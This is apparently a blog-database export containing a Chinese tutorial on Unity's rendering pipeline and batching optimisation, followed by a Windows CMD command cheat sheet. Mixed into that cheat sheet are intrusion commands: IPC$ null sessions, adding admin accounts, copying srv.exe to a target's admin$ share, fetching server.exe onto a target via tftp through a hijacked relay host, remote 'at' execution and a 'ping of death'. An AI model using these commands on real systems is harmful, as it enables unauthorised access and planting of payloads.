16.6ms一帧 是非常好的,不需要优化的,如果达到了 33ms每帧 则需要进行优化了.因为 33ms每帧 则一秒才有30帧,显然是需要优化的.(<a href=\"https://www.freesion.com/article/1005726774/\" target=\"_blank\" rel=\"noopener\">https://www.freesion.com/article/1005726774/</a>)<br>batches 一帧中需要进行批处理的数目,官方建议低于 250 个.<br>Saved By Batching 合并的批处理数目,这个数字表明了批处理为我们节省了多少 Draw Call<br>Tris 和 Verts 表示需要绘制的三角面片(官方建议在手机上低于200K面)与顶点数目(官方建议在手机上低于100K 个顶点)<br>Screen 屏幕的大小以及它占用的内存大小<br>SetPass 渲染使用的 Pass 的数目,每个 Pass 都需要 Unity 的 runtime 来绑定一个新的 shader ,这可能造成 CPU 的瓶颈<br>Visible Skinned Meshes 渲染蒙皮网格的数目<br>Animations 播放的动画数目        </p>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>2: 性能分析器(Profiler)</p>\n<blockquote>\n<p>Rendering 里面展示了很详细的信息.        </p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p>3:帧调试器(Frame Debugger)</p>\n<blockquote>\n<p>可以得到 unity 是如何渲染当前帧的</p>\n</blockquote>\n</blockquote>\n<ul>\n<li>批处理<blockquote>\n<p>1:静态批处理:自由度高,限制很少,需要共享同一材质.缺点是占用更多的内存,经过静态批处理的物体都不可以移动了,即时在脚本里面尝试改变物体的位置.如果在静态批处理前一些物体共享了相同的网格,那么再内存中每一个物体都会对应一个该网格的复制品,即一个网格会变成多个网格再发送给 GPU,如果有 1000 个相同网格的模型,就会多出 1000 倍的内存.在内存上面 VBO total 会变大.</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>2:动态批处理:优点是一切处理都是 unity 自动完成的,不需要我们自己做任何操作,而且物体是可以移动的,但缺点是限制很多,需要相同的渲染状态,CPU 压力大.原理是每一帧把可以进行批处理的模型网格进行合并,再把合并后的模型数据传递给 GPU,然后使用同一个材质对齐渲染,因为是每帧都在合并,所以物体可以移动.要保证相同材质,相同 shader,相同缩放,相同顶点.测试:在一个空场景把所有运动的模型导入,让其运动,然后测试 draw call 是否是一个,Save By Baching 的数目是否大于 0,这种就是动态合批了.</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"基本流程\"><a href=\"#基本流程\" class=\"headerlink\" title=\"基本流程\"></a>基本流程</h1><ul>\n<li>开发准备流程<blockquote>\n<ul>\n<li>1:搭建场景,添加摄像机,添加光源,设置摄像机,设置光源.</li>\n<li>2:剔除无需渲染的物体,包括不限于 2D 物体,3D 物体 </li>\n<li>3:设置物体的渲染状态,包括不限于设置材质,纹理,shader 等</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>电脑 CPU 运行流程<blockquote>\n<ul>\n<li>1:准备数据,上面开发准备流程最后会在CPU中生成几何信息,一般叫做”渲染图元”,几何信息就是 点,线,面 的数据.会将这些数据加载到系统内存(Random Access Memory,RAM).在 Unity3d 对应的类是 Mesh</li>\n<li>2:准备数据,将设置的渲染状态也读进内存中.渲染状态定义了场景内的网格是怎样被渲染的.比如:设置顶点着色器/片元着色器,光源,材质,纹理等,动态修改渲染状态等.在 Unity3d 对应的类是 MeshRenderer</li>\n<li>3:CPU 向 GPU 发送 DrawCall 命令,开始渲染.这个命令指向一个等待被渲染的图元列表(就是点线面数据,不包含渲染状态).GPU 会拿到渲染状态和图元列表进行渲染成像.在 Unity3d 里面被隐藏了细节,无法看到</li>\n<li>其他知识:一般情况下,DrawCall命令,不应该频繁,unity 官方设定固定时间内 250 个以下.DrawCall命令指向的图元列表不应该过多,这个也是应该注意的.</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>电脑GPU运行流程<blockquote>\n<ul>\n<li>–&gt;A:GPU 将对这些几何数据进行处理,会输出下一个阶段需要的信息.比如会将顶点坐标转换到屏幕空间中,输出一些二维顶点坐标,每个顶点对应的深度值,着色等信息.一般叫做”几何阶段”,开启几何阶段<blockquote>\n<ul>\n<li>–&gt;1:顶点着色器.(由顶点数据传入,传出顶点数据,这些数据可能被增加或者被删减).</li>\n<li>–&gt;2:曲面细分着色器</li>\n<li>–&gt;3:几何着色器</li>\n<li>–&gt;4:裁剪</li>\n<li>–&gt;5:屏幕映射</li>\n</ul>\n</blockquote>\n</li>\n<li>–&gt;B:将上一阶段生成的数据,用来生产屏幕上的像素,渲染出最终的图像.一般叫做”光栅化阶段”,开启光栅化阶段<blockquote>\n<ul>\n<li>–&gt;1:三角形设置</li>\n<li>–&gt;2:三角形遍历</li>\n<li>–&gt;3:片元着色器</li>\n<li>–&gt;4:逐片元操作</li>\n</ul>\n</blockquote>\n</li>\n<li>–&gt;C:生成最终的屏幕2D图像</li>\n<li>其他知识:一般情况下,网格和纹理等数据会被加载到显卡上的存储空间,显存(Video Random Access Memory,VRAM),这是由于在显存上面读取数据比在内存读取数据渲染更快.</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"GPU渲染流程\"><a href=\"#GPU渲染流程\" class=\"headerlink\" title=\"GPU渲染流程\"></a>GPU渲染流程</h1><ul>\n<li>顶点数据–&gt;顶点着色器–&gt;曲面细分着色器–&gt;几何着色器–&gt;裁剪–&gt;屏幕映射–&gt;三角形设置–&gt;三角形遍历–&gt;片元着色器–&gt;逐片元操作–&gt;屏幕2D图像,屏幕 2d 图像也是可以表示三维立体感受的(主要靠脑补).<blockquote>\n<ul>\n<li>A:开启几何阶段</li>\n<li>1:顶点着色器(Vertex Shader)是完全可编程的,通常用于实现顶点的控件变换,顶点着色,坐标变换,逐顶点光照,后续阶段的数据等功能.输入进来的每个顶点都会调用一次顶点着色器,不可以创建或者销毁顶点,无法得到顶点与顶点之间的关系.(无法得知2 个顶点是否属于同一个三角网络),这样情况下,GPU 可以并行处理很多个顶点.必须完成的工作    </li>\n<li><strong>把顶点坐标从模型空间(本身空间)转换到齐次裁剪空间*</strong><br>就是将一个三维坐标系中的点,变为一个立体正方形中的一个点,由硬件做透视除法之后,得到最终的归一化设备坐标(Normalized Device Coordinates,NDC)<pre><code>  o.pos = mul(UNITY_MVP,v.position);\n  UnityObjectToClipPos(v.vertex);</code></pre></li>\n<li>2:曲面细分着色器(Tessellation Shader)是一个可选的着色器,它用于细分图元.</li>\n<li>3:几何着色器(Geometry Shader)同样是一个可选的着色器,它可以被用于执行逐图元的着色操作,或者被用于产生更多的图元.</li>\n<li>4:裁剪(Clipping),这一阶段的目的是将那些不在摄像机视野内的顶点裁剪掉,并剔除某些三角图元的面片.这个阶段可以配置,不可以编程,比如:可以使用自定义的裁剪平面来配置裁剪区域,也可以通过指令控制裁剪三角图元的正面还是背面.<br>一个图元和摄像机视野的关系有 3 种,完全在视野内,部分在视野内,完全在视野外.部分在视野内的物体需要被裁剪.即在齐次裁剪空间里面,所有的顶点都被放入这个立方体内了,不在立方体内的映射,直接被裁剪掉,不会被渲染.</li>\n<li>5:屏幕映射(Screen Mapping),不可以编程和配置,负责把每个图元的坐标转换到屏幕坐标系中.作用是从齐次裁剪的立方体内将三维坐标系x,y,z –&gt; 变成二维坐标的 x,y.<br>这个地方需要理解屏幕坐标系(Screen Coordinates),这个是纯二维坐标系,对应的是立方体内的 x,y,那么 z 值跑哪里了?<br>屏幕坐标系和 z 坐标构成了窗口坐标系(Window Coordinates),z值参与了GPU的光栅化阶段.窗口里面的内容可以让人眼有明显的三维立体感受,而屏幕坐标系没有三维立体感受.z值参与了表示在三维立体感受中的物体距离屏幕坐标系有多远,也就是一个点距离一个面有多远,这个需要想象力</li>\n<li>B:开启光栅化阶段,接收上个阶段输出的数据(例如屏幕坐标系下的顶点位置,深度值(z坐标),法线方向,视角方向等数据),概览:计算每个图元覆盖了屏幕二维坐标系的哪些像素,以及为这些像素计算它们的颜色</li>\n<li>6:三角形设置(Triangle Setup):固定函数,不可编程与配置.上个阶段我们得到的都是三角网格的顶点,即我们得到的是三角形的每条边的 2 个端点,根据这些数据计算三角形每条边的像素坐标,从而知道三角网格对像素的覆盖情况.       </li>\n<li>7:三角形遍历(Triangle Traversal):固定函数,不可编程与配置.检查每个像素是否被一个三角网格所覆盖,如果这个像素被覆盖,就生成一个片元(fragment)对象.找到哪些像素被三角网格覆盖的过程就是三角形遍历,这个阶段也被称为扫描变换(Scan Conversion).<br>寻找过程中,会对整个覆盖区域的像素进行插值计算,得出深度值,最终输出一个片元对象.<br>片元对象不是像素,是数据的集合,包括屏幕坐标,深度信息,顶点信息,法线,颜色,纹理坐标uv等等.</li>\n<li>8:片元着色器(Fragment Shader),完全可配置与编程.用于实现逐片元的着色操作.在DirectX中,被称为像素着色器(Pixel Shader).<br>得到的一些数据,是根据从顶点着色器中输出的数据插值得到的,最终输出是一个或者多个颜色值.<br>程序开发会修改插值得到的颜色,将顶点着色器输出的纹理坐标,对应片元的纹理坐标,进行颜色的修改等.</li>\n<li>9:逐片元操作(Per-Fragment Operations),可配置,负责修改颜色,深度缓冲,混合等等.在DirectX中,被称为输出合并阶段(Output-Merger)).<br>主要工作是:<br>1):决定每个片元的可见性,深度测试(Depth Test),模板测试(Stencil Test),如果不通过测试,则放弃这个片元,测试的含义类似于闯关.这个地方的测试尤其重要.<br>模板测试–&gt;拿到颜色缓冲区的参考值–&gt;对比片元的参考值–&gt;舍弃或者写入颜色缓冲区<br>深度测试–&gt;拿到颜色缓冲区的深度值–&gt;对比片元的深度值–&gt;舍弃或者进入下一步–&gt;是否开启深度写入–&gt;舍弃或者写入颜色缓冲区<br>2):当你闯关成功,就会把片元的颜色值和已经存储在颜色缓冲区中的颜色进行合并,或者说是混合.<br>3)混合之后的颜色,写入颜色缓冲区中,当你进行渲染的时候,颜色缓冲区中已经有数据了,这次的颜色数据是覆盖颜色缓冲区的数据,还是进行合并融合,就是这一步需要做的事情.<br>4)为了避免我们看到正在进行光栅化的图元,GPU 使用了双重缓冲,前置缓冲区和后置缓冲区来回进行交换,因此保证了我们看到的图像总是连续的</li>\n</ul>\n</blockquote>\n</li>\n<li>注意上面讲到的顺序,在不同平台可能排列不一致,这是因为图像编程的实现不太相同,也可能是GPU 做了很多优化.      </li>\n</ul>\n<h1 id=\"GPU渲染过程中的空间变换过程\"><a href=\"#GPU渲染过程中的空间变换过程\" class=\"headerlink\" title=\"GPU渲染过程中的空间变换过程\"></a>GPU渲染过程中的空间变换过程</h1><ul>\n<li>1:模型空间(model space),对象空间(object space)或者局部空间(local space),使用的左手坐标系,都表示当前你这个物体在自身坐标系下的空间.</li>\n<li>2:世界空间(world space)就是 global 空间,使用的左手坐标系,它建立了我们想象中的无限大空间,但是在程序中,是有限的,有界的.这个空间在我们正常交流中,可以指一个办公室,一座大楼,一座农场等等,它们才是玩家所能达到最大的场景,这叫做世界空间,也就是说一个办公室,一座大楼,一座农场就是世界空间.要理解这个,真的靠想象力.<br>世界空间的原点,就是游戏空间的中心点.我们可以把 unity 想象成一个树状图结构,有一个虚拟的根节点,根节点下有多个场景(在 Scenes In Build 中有很多可以打包的场景),这些场景又是一个节点,这个场景节点下面又有很多物体,就放在 Hierarchy 下面,可以把GameObject 的父节点认为是当前的这个场景.在Hierarchy 下面第一层的GameObject就是世界空间,第二层以及以后才是模型空间.       </li>\n<li><strong>第一步变换:将顶点坐标从模型空间变换到世界空间,叫做模型变换*</strong></li>\n<li>3:观察空间(view space)也被成为摄像机空间(camera space),模型空间中的特殊空间,使用的右手坐标系,这是一个三维空间.而屏幕空间是一个二维空间,采用的是人的脑补才出现的三维空间.      </li>\n<li><strong>第二步变换:将顶点坐标从世界空间变换到观察空间,叫做观察变换*</strong></li>\n<li>4:裁剪空间(clip space)也被称为齐次裁剪空间,使用的矩阵叫做裁剪矩阵(clip matrix),也叫做投影矩阵(projection matrix),作用是对渲染图元进行裁剪,位于空间内部的图元会被保留,位于外部的被剔除,与这块空间边界相交的图元会被裁剪,这块空间由摄像机的视椎体决定.视椎体有 6 个平面,被称为裁剪平面(clip plans).     </li>\n<li><strong>第三步变换:将顶点坐标从观察空间变换到裁剪空间,叫做裁剪变换*</strong></li>\n<li>5:屏幕空间(screen space)需要经过真正的投影.需要进行标准齐次除法(homogeneous division),在 openGL 中被称为归一化设备坐标(Normalized Device Coordinates,NDC),经过这个步骤之后,裁剪空间变成了立方体空间,之前是梯形空间.通过映射算法,直接映射在屏幕上面. </li>\n<li><strong>第四步变换:将顶点坐标从裁剪空间映射到屏幕空间*</strong></li>\n<li>6:总结,<br>模型空间—&gt;模型变换—&gt;世界空间—&gt;观察变换—&gt;观察空间—&gt;投影变换—&gt;裁剪空间—&gt;屏幕映射—&gt;屏幕空间<br>将模型变换,观察变换以及投影变换串联成一个矩阵,即 MVP 矩阵,用于将顶点从模型空间中转换到裁剪空间中.</li>\n</ul>\n<h1 id=\"Draw-Call\"><a href=\"#Draw-Call\" class=\"headerlink\" title=\"Draw Call\"></a>Draw Call</h1><ul>\n<li>1:draw call 本身的含义很简单.就是 CPU 调用图像编程接口,命令 GPU 进行渲染的操作.接口命令的例子:OpenGL 中的 glDrawElements 命令或者 DirectX 中的 DrawIndexedPrimitive 命令.</li>\n<li>2:我们需要让 CPU 以及 GPU 并行工作,以提高效率,就产生了一个命令缓冲区(Command Buffer).命令缓冲区包含了一个命令队列,由 CPU 向里面添加命令,GPU 从中读取命令,添加和读取的过程是相互独立的.先进先出模式,CPU 生产,GPU 消费.</li>\n<li>3:命令缓冲区里面不止draw call一种命令,还有改变渲染状态的命令(更加耗时).</li>\n<li>4:如果频繁调用 draw call,CPU就会向 GPU 发送很多内容,包括数据,状态和命令,检查渲染状态等.如果draw call太多,CPU 就会花费大量时间在上面,造成 CPU 过载,影响帧率.</li>\n<li>5:优化draw call,就是将相同渲染状态的网格,合并成一个大的网格,提交一次即可.这就是批处理(Batching)的方法.一般情况下静态批处理很好做,动态批处理也会合并,但是因为物体是在不断运动的,所以每帧都会有合批,这对 CPU 是一种压榨性能的操作.避免使用大量很小的网格,非要用,考虑合批.尽量使用相同的材质(同一渲染状态).</li>\n</ul>\n<h1 id=\"渲染优化\"><a href=\"#渲染优化\" class=\"headerlink\" title=\"渲染优化\"></a>渲染优化</h1><ul>\n<li>影响性能的因素有哪些?<blockquote>\n<p><strong>A</strong>:CPU 中过多的 draw call ,复杂的脚本或者物理模拟<br><strong>B</strong>:GPU 顶点处理:过多的顶点,过多的逐顶点计算.片元处理,过多的片元(即可能是由于分辨率造成的,也可能是由于 overdraw 造成的),过多的逐片元计算.<br><strong>C</strong>:带宽,也就是 CPU 向 GPU 提交 draw call 命令携带的数据需要一个通道送给 GPU,这条通道就是带宽.CPU 在每次通知 GPU 进行渲染之前,都需要提前准备好顶点数据(如:位置,法线,颜色,纹理坐标等),然后调用一系列 API 把它们放到 GPU 可以访问到的指定位置,最后,调用一个绘制命令(会改变很多渲染状态的设置),来告诉 GPU 进行渲染.调用时会产生一个 draw call ,过多的 draw call 或者 一次 draw call 的数据量过大,都会导致 CPU 将大部分时间都花费在提交 draw call 的工作上面.<br><strong>D</strong>:填充率, 降低显示分辨率并运行游戏。如果较低的显示分辨率使游戏运行得更快，你可能会受到GPU填充率的限制。       </p>\n</blockquote>\n</li>\n<li>优化手段<blockquote>\n<p>1:CPU 使用(动态,静态)批处理降低 draw call<br>2:GPU 让美术同学降低顶点,有时候 GPU 会将一个顶点拆成多个顶点,原因是分离纹理坐标(uv splits)或者产生平滑的边界(smoothing splits),优化建议:尽可能移除不必要的硬边以及纹理衔接,避免边界平滑和纹理分离.减少模型面数,使用 LOD 技术减少顶点数,模型离摄像机很远时,减少模型上面的面数.<br>3:GPU 程序方面减少需要处理的顶点数目,优化几何体,使用模型的 LOD(Level of Detail)技术.使用遮挡剔除(Occlusion Culling)技术<br>4:减少需要处理的片元数目,在于减少overdraw,就是同一个像素被绘制了多次.控制绘制程序,避免使用半透明队列,时刻警惕透明物体,减少实时光照.<br>5:在 shader 中减少计算复杂度,不要使用 分支语句与循环语句,避免使用 sin,tan,pow,log 等数学运算,使用查找表来作为代替,不要使用 discard 操作.使用 Shader 的 LOD(Level of Detail)技术,只有 shader 的 LOD 值小于某个设定的值,这个 shader 才会被使用,而使用了那些超过设定值的 shader 的物体将不会被渲染.<br>6:图片设置,减小纹理大小,尽量小于 1024x1024,长宽值最好是 2 的整数幂.<br>7:使用 渲染统计窗口 Rendering Statistics Window,性能分析器(Profiler),以及帧调试器(Frame Debugger)     </p>\n</blockquote>\n</li>\n<li>用好工具<blockquote>\n<p>1:渲染统计窗口 Rendering Statistics Window</p>\n<blockquote>\n<p>Graphic 的右侧显示了 FPS 数目以及毫秒数.毫秒数表示处理和渲染一帧所需的时间.FPS 表示一段时间内的平均值。平均 FPS = 帧数 / 一段时长。帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。一般情况是在 Update 记录时长与调用次数,用调用次数/记录时长=FPS,如果记录时长=1秒则表示每秒多少帧.每秒 60 帧是非常好的,现在手游基本保持在每秒 30 帧以上的标准.用记录时长 * 1000 表示毫秒数,记录时长 * 1000 / 调用次数,表示多少毫秒每帧.如果记录时长=1秒,则一帧所用时长为 1000 / 调用次数 毫秒.稳定情况下 16.6ms一帧 是非常好的,不需要优化的,如果达到了 33ms每帧 则需要进行优化了.因为 33ms每帧 则一秒才有30帧,显然是需要优化的.(<a href=\"https://www.freesion.com/article/1005726774/\" target=\"_blank\" rel=\"noopener\">https://www.freesion.com/article/1005726774/</a>)<br>batches 一帧中需要进行批处理的数目,官方建议低于 250 个.<br>Saved By Batching 合并的批处理数目,这个数字表明了批处理为我们节省了多少 Draw Call<br>Tris 和 Verts 表示需要绘制的三角面片(官方建议在手机上低于200K面)与顶点数目(官方建议在手机上低于100K 个顶点)<br>Screen 屏幕的大小以及它占用的内存大小<br>SetPass 渲染使用的 Pass 的数目,每个 Pass 都需要 Unity 的 runtime 来绑定一个新的 shader ,这可能造成 CPU 的瓶颈<br>Visible Skinned Meshes 渲染蒙皮网格的数目<br>Animations 播放的动画数目        </p>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>2: 性能分析器(Profiler)</p>\n<blockquote>\n<p>Rendering 里面展示了很详细的信息.        </p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p>3:帧调试器(Frame Debugger)</p>\n<blockquote>\n<p>可以得到 unity 是如何渲染当前帧的</p>\n</blockquote>\n</blockquote>\n<ul>\n<li>批处理<blockquote>\n<p>1:静态批处理:自由度高,限制很少,需要共享同一材质.缺点是占用更多的内存,经过静态批处理的物体都不可以移动了,即时在脚本里面尝试改变物体的位置.如果在静态批处理前一些物体共享了相同的网格,那么再内存中每一个物体都会对应一个该网格的复制品,即一个网格会变成多个网格再发送给 GPU,如果有 1000 个相同网格的模型,就会多出 1000 倍的内存.在内存上面 VBO total 会变大.</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>2:动态批处理:优点是一切处理都是 unity 自动完成的,不需要我们自己做任何操作,而且物体是可以移动的,但缺点是限制很多,需要相同的渲染状态,CPU 压力大.原理是每一帧把可以进行批处理的模型网格进行合并,再把合并后的模型数据传递给 GPU,然后使用同一个材质对齐渲染,因为是每帧都在合并,所以物体可以移动.要保证相同材质,相同 shader,相同缩放,相同顶点.测试:在一个空场景把所有运动的模型导入,让其运动,然后测试 draw call 是否是一个,Save By Baching 的数目是否大于 0,这种就是动态合批了.</p>\n</blockquote>\n"},{"title":"MD 格式","date":"2020-05-08T03:41:32.000Z","_content":"\n运行操作\n\nCMD命令：开始－>运行－>键入cmd或command(在命令行里可以看到系统版本、文件系统版本)\n\nCMD命令锦集\n\n1. gpedit.msc-----组策略\n\n　　2. sndrec32-------录音机\n\n　　3. Nslookup-------IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。\n\n　　4. explorer-------打开资源管理器\n\n　　5. logoff---------注销命令\n\n　　6. shutdown-------60秒倒计时关机命令\n\n　　7. lusrmgr.msc----本机用户和组\n\n　　8. services.msc---本地服务设置\n\n　　9. oobe/msoobe /a----检查XP是否激活\n\n　　10. notepad--------打开记事本\n\n　　11. cleanmgr-------垃圾整理\n\n　　12. net start messenger----开始信使服务\n\n　　13. compmgmt.msc---计算机管理\n\n　　14. net stop messenger-----停止信使服务\n\n　　15. conf-----------启动netmeeting\n\n　　16. dvdplay--------DVD播放器\n\n　　17. charmap--------启动字符映射表\n\n　　18. diskmgmt.msc---磁盘管理实用程序\n\n　　19. calc-----------启动计算器\n\n　　20. dfrg.msc-------磁盘碎片整理程序\n\n　　21. chkdsk.exe-----Chkdsk磁盘检查\n\n　　22. devmgmt.msc--- 设备管理器\n\n　　23. regsvr32 /u *.dll----停止dll文件运行\n\n　　24. drwtsn32------ 系统医生\n\n　　25. rononce -p----15秒关机\n\n　　26. dxdiag---------检查DirectX信息\n\n　　27. regedt32-------注册表编辑器\n\n　　28. Msconfig.exe---系统配置实用程序\n\n　　29. rsop.msc-------组策略结果集\n\n　　30. mem.exe--------显示内存使用情况\n\n　　31. regedit.exe----注册表\n\n　　32. winchat--------XP自带局域网聊天\n\n　　33. progman--------程序管理器\n\n　　34. winmsd---------系统信息\n\n　　35. perfmon.msc----计算机性能监测程序\n\n　　36. winver---------检查Windows版本\n\n　　37. sfc /scannow-----扫描错误并复原\n\n　　38. taskmgr-----任务管理器（2000/xp/2003\n\n　　40. wmimgmt.msc----打开windows管理体系结构(WMI)\n\n　　41. wupdmgr--------windows更新程序\n\n　　42. wscript--------windows脚本宿主设置\n\n　　43. write----------写字板\n\n　　45. wiaacmgr-------扫描仪和照相机向导\n\n　　46. winchat--------XP自带局域网聊天\n\n　　49. mplayer2-------简易widnows media player\n\n　　50. mspaint--------画图板\n\n　　51. mstsc----------远程桌面连接\n\n　　53. magnify--------放大镜实用程序\n\n　　54. mmc------------打开控制台\n\n　　55. mobsync--------同步命令\n\n　　57. iexpress-------木马捆绑工具，系统自带\n\n　　58. fsmgmt.msc-----共享文件夹管理器\n\n　　59. utilman--------辅助工具管理器\n\n　　61. dcomcnfg-------打开系统组件服务\n\n　　62. ddeshare-------打开DDE共享设置\n\n　　110. osk------------打开屏幕键盘\n\n　　111. odbcad32-------ODBC数据源管理器\n\n　　112. oobe/msoobe /a----检查XP是否激活\n\n　　68. ntbackup-------系统备份和还原\n\n　　69. narrator-------屏幕“讲述人”\n\n　　70. ntmsmgr.msc----移动存储管理器\n\n　　71. ntmsoprq.msc---移动存储管理员操作请求\n\n　　72. netstat -an----(TC)命令检查接口\n\n　　73. syncapp--------创建一个公文包\n\n　　74. sysedit--------系统配置编辑器\n\n　　75. sigverif-------文件签名验证程序\n\n　　76. ciadv.msc------索引服务程序\n\n　　77. shrpubw--------创建共享文件夹\n\n　　78. secpol.msc-----本地安全策略\n\n　　79. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码\n\n　　80. services.msc---本地服务设置\n\n　　81. Sndvol32-------音量控制程序\n\n　　82. sfc.exe--------系统文件检查器\n\n　　83. sfc /scannow---windows文件保护\n\n　　84. ciadv.msc------索引服务程序\n\n　　85. tourstart------xp简介（安装完成后出现的漫游xp程序）\n\n　　86. taskmgr--------任务管理器\n\n　　87. eventvwr-------事件查看器\n\n　　88. eudcedit-------造字程序\n\n　　89. compmgmt.msc---计算机管理\n\n　　90. packager-------对象包装程序\n\n　　91. perfmon.msc----计算机性能监测程序\n\n　　92. charmap--------启动字符映射表\n\n　　93. cliconfg-------SQL SERVER 客户端网络实用程序\n\n　　94. Clipbrd--------剪贴板查看器\n\n　　95. conf-----------启动netmeeting\n\n　　96. certmgr.msc----证书管理实用程序\n\n　　97. regsvr32 /u *.dll----停止dll文件运行\n\n　　98. regsvr32 /u zipfldr.dll------取消ZIP支持\n\n　　99. cmd.exe--------CMD命令提示符\n\n操作详解　　\n\nnet use ipipc$ \" \" /user:\" \" 建立IPC空链接\n\n　　net use ipipc$ \"密码\" /user:\"用户名\" 建立IPC非空链接\n\n　　net use h: ipc$ \"密码\" /user:\"用户名\" 直接登陆后映射对方C：到本地为H:\n\n　　net use h: ipc$ 登陆后映射对方C：到本地为H:\n\n　　net use ipipc$ /del 删除IPC链接\n\n　　net use h: /del 删除映射对方到本地的为H:的映射\n\n　　net user 用户名　密码　/add 建立用户\n\n　　net user guest /active:yes 激活guest用户\n\n　　net user 查看有哪些用户\n\n　　net user 帐户名 查看帐户的属性\n\n　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限\n\n　　net start 查看开启了哪些服务\n\n　　net start 服务名　开启服务；(如:net start telnet， net start schedule)\n\n　　net stop 服务名 停止某服务\n\n　　net time 目标ip 查看对方时间\n\n　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息\n\n　　net view 查看本地局域网内开启了哪些共享\n\n　　net view ip 查看对方局域网内开启了哪些共享\n\n　　net config 显示系统网络设置\n\n　　net logoff 断开连接的共享\n\n　　net pause 服务名 暂停某服务\n\n　　net send ip \"文本信息\" 向对方发信息\n\n　　net ver 局域网内正在使用的网络连接类型和信息\n\n　　net share 查看本地开启的共享\n\n　　net share ipc$ 开启ipc$共享\n\n　　net share ipc$ /del 删除ipc$共享\n\n　　net share c$ /del 删除C：共享\n\n　　net user guest 12345 用guest用户登陆后用将密码改为12345\n\n　　net password 密码 更改系统登陆密码\n\n　　netstat -a 查看开启了哪些端口,常用netstat -an\n\n　　netstat -n 查看端口的网络连接情况，常用netstat -an\n\n　　netstat -v 查看正在进行的工作\n\n　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况\n\n　　netstat -s 查看正在使用的所有协议使用情况\n\n　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名\n\n　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。\n\n　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。\n\n　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)\n\n　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息\n\n　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)\n\n　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)\n\n　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件\n\n　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）\n\n　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖\n\n　　fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，\"> \"和\"> >\" 是重定向命令\n\n　　at id号 开启已注册的某个计划任务\n\n　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止\n\n　　at id号 /delete 停止某个已注册的计划任务\n\n　　at 查看所有的计划任务\n\n　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机\n\n　　finger username @host 查看最近有哪些用户登陆\n\n　　telnet ip 端口 远和登陆服务器,默认端口为23\n\n　　open ip 连接到IP（属telnet登陆后的命令）\n\n　　telnet 在本机上直接键入telnet 将进入本机的telnet\n\n　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件\n\n　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下\n\n　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件\n\n　　copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：\n\n　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件\n\n　　用参数/e才可连目录下的子目录一起复制到目标地址下。\n\n　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送\n\n　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机\n\n　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)\n\n　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface\n\n　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息\n\n　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令\n\n　　mem 查看cpu使用情况\n\n　　attrib 文件名(目录名) 查看某文件（目录）的属性\n\n　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性\n\n　　